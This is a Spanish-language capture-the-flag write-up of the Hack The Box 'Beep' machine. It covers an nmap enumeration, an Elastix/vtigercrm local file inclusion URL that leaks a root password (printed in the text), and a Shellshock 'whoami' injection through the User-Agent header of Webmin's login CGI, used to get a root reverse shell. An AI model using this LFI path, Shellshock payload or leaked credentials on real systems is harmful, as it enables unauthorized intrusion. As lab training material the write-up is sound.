#  BEEP MACHINE

**Autor: Christian Jimenez**

![logo](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/1.PNG)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
	- [[#LOCAL FILE INCLUSION|LOCAL FILE INCLUSION]]
	- [[#SHELLSHOCK|SHELLSHOCK]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.7 -oG allPorts
```

La salida nos muesta los puertos 22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 abiertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/2.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 -sV -sC 10.10.10.7 -oN targeted
```

y esta es la salida:

```bash
# Nmap 7.91 scan initiated Mon Jul 19 10:20:37 2021 as: nmap -p22,25,80
       │  targeted 10.10.10.7
   2   │ Nmap scan report for 10.10.10.7
   3   │ Host is up (0.20s latency).
   4   │ 
   5   │ PORT      STATE SERVICE    VERSION
   6   │ 22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
   9   │ |_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
  10   │ 25/tcp    open  smtp       Postfix smtpd
  11   │ |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETR
       │ N, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
  12   │ 80/tcp    open  http       Apache httpd 2.2.3
  13   │ |_http-server-header: Apache/2.2.3 (CentOS)
  14   │ |_http-title: Did not follow redirect to https://10.10.10.7/
  15   │ 110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
  16   │ |_pop3-capabilities: USER TOP STLS PIPELINING IMPLEMENTATION(Cyrus POP3
       │  server v2) APOP AUTH-RESP-CODE RESP-CODES EXPIRE(NEVER) UIDL LOGIN-DEL
       │ AY(0)
  17   │ 111/tcp   open  rpcbind    2 (RPC #100000)
  18   │ 143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
  19   │ |_imap-capabilities: THREAD=REFERENCES IMAP4 ATOMIC CATENATE RIGHTS=kxt
       │ e SORT URLAUTHA0001 X-NETSCAPE SORT=MODSEQ LIST-SUBSCRIBED BINARY ACL L
       │ ISTEXT IDLE LITERAL+ CONDSTORE MULTIAPPEND OK THREAD=ORDEREDSUBJECT UNS
       │ ELECT ANNOTATEMORE NO IMAP4rev1 QUOTA Completed CHILDREN ID UIDPLUS MAI
       │ LBOX-REFERRALS NAMESPACE RENAME STARTTLS
  20   │ 443/tcp   open  ssl/https?
  21   │ | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=
       │ SomeOrganization/stateOrProvinceName=SomeState/countryName=--
  22   │ | Not valid before: 2017-04-07T08:22:08
  23   │ |_Not valid after:  2018-04-07T08:22:08
  24   │ |_ssl-date: 2021-07-19T14:17:49+00:00; -6m16s from scanner time.
  25   │ 879/tcp   open  status     1 (RPC #100024)
  26   │ 993/tcp   open  ssl/imap   Cyrus imapd
  27   │ |_imap-capabilities: CAPABILITY
  28   │ 995/tcp   open  pop3       Cyrus pop3d
  29   │ 3306/tcp  open  mysql      MySQL (unauthorized)
  30   │ |_ssl-cert: ERROR: Script execution failed (use -d to debug)
  31   │ |_ssl-date: ERROR: Script execution failed (use -d to debug)
  32   │ |_sslv2: ERROR: Script execution failed (use -d to debug)
  33   │ |_tls-alpn: ERROR: Script execution failed (use -d to debug)
  34   │ |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
  35   │ 4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5
       │ _6.4 (included w/cyrus imap)
  36   │ 4445/tcp  open  upnotifyp?
  37   │ 4559/tcp  open  hylafax    HylaFAX 4.3.10
  38   │ 5038/tcp  open  asterisk   Asterisk Call Manager 1.1
  39   │ 10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
  40   │ |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1)
       │ .
  41   │ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localho
       │ st; OS: Unix
  42   │ 
  43   │ Host script results:
  44   │ |_clock-skew: -6m16s
  45   │ 
  46   │ Service detection performed. Please report any incorrect results at htt
       │ ps://nmap.org/submit/ .
  47   │ # Nmap done at Mon Jul 19 10:27:14 2021 -- 1 IP address (1 host up) sca
       │ nned in 397.24 seconds

```

son muchos puertos asi que vamos a empezar con el 80, si ingresamos a la pagina vemos que tiene un certificado autofirmado y es un panel de login:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/3.PNG)

Buscamos credenciales por defecto pero ninguna funciono.

La enumeracion de directorios con wfuzz mostró algunas carpetas pero no fue de mucha ayuda al revisar cada una.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/4.PNG)

En el login muestra el servicio que esta alojado en la pagina (elastix), no tenemos la version pero buscamos en searchsploit de todas formas: 

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/5.PNG)

Vemos varios resultados, pero en este caso intentando con el Local File Inclusion se tiene algo interesante.

## EXPLOTACION

### LOCAL FILE INCLUSION

si examinamos el exploit de local file inclusion se una ruta que podemos probar:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/6.PNG)

colocamos esa ruta junto a la direccion IP en el navegador:

```html
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Y obtenemos lo siguiente:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/7.PNG)

Para darle un mejor formato hacemos Ctrl+u y si bajamos vemos unas credenciales:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/8.PNG)

podemos leer diferentes archivos con el LFI y se tiene 2 usuarios potenciales donde se cree que esta la flag: root y fannis. Auque se podria entrar como otro usuario y hacer un movimiento lateral , se tiene el puerto 22 abierto y si intentamos con root o fannis y la contraseña encontrada en el LFI tenemos exito con root:

user: root
pass: jEhdIekWmdjE

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7 
```

El parametro **-oKexAlgorithms=+diffie-hellman-group1-sha1** es porque nos daba un error de negociacion de claves.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/9.PNG)

Ok eso fue demasiado sencillo, pero se puede explotar de mas formas.

### SHELLSHOCK

Vemos que estaba el puerto 10000 abierto con un servicio http:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/10.PNG)

si ingresamos vemos un panel de inicio de sesion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/11.PNG)

si colocamos admin y password (o cualquier otra credencial) nos dice que es incorrecto pero en la url veo que se agrega un archivo **session_login.gci**: 

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/12.PNG)

cuando se ve un archivo de tipo .cgi se puede probar el ataque shellshock, esto si la shell es vulnerable.

Estos archivos interactuan con una bash y si es una bash vulnerable es posible ejecutar comandos arbitrarios.

La vulnerabilidad esta en la inyeccion de comandos en variables de entorno, sabemos podemos definir una variable de entorno de la siguiente manera:

```bash
export SALUDO="hola mundo"

echo $SALUDO #hola mundo
```

tambien es posible almacenar dentro de una variable de entorno una funcion escrita en bash que tiene la siguiente sintaxis:

```bash

nombre_funcion(){contenido}

#EJEMPLO

export saludo="(){echo \"hola mundo\"}"

bash -c 'saludo' #hola mundo
```

En este ejemplo no es necesario colocar un nombre de funcion y estamos escapando las comillas dobles. Dentro de una variable de entorno declarada como si tuviera una funcion se puede ejecutar comandos del sistema, en este caso hicimos un simple echo dentro de la funcion.

Sabemos que con **;** se puede concatenar comandos, que pasa si colocamos lo siguiente:

```bash
export saludo="(){:;}; whoami"
```

Pues si la bash es vulnerable es posible realizar la ejecucion de comandos, ya que despues de una funcion que no hace nada se esta concatenando otro comando mendiante el **;**.

A veces es necesario colocar 1 o 2 **echo;** despues de la funcion o antes del comando.

Ahora a nivel web esto se puede coloacr en una cabecera, por ejemplo el **User-Agent** ya que en el servidor web estas cabeceras las reconoce como variables de entorno.

Entonces volviendo a la maquina, si con burpsuite interceptamos la peticion que se realiza al **session_login.cgi** y en su cabecera **User-Agent** probamos esta inyeccion de payload veamos si podemos obtener una reverse shell:

interceptamos la peticion poniendo cualquier dato y modificarmos esa cabecera:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/13.PNG)

si ahora eso lo mandamo por el repiter y nos colocamos en escucha con netcat:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BEEP/images/14.PNG)

Vemos que tenemos ejecucion remota de comandos como Root y ya podriamos leer las flags.



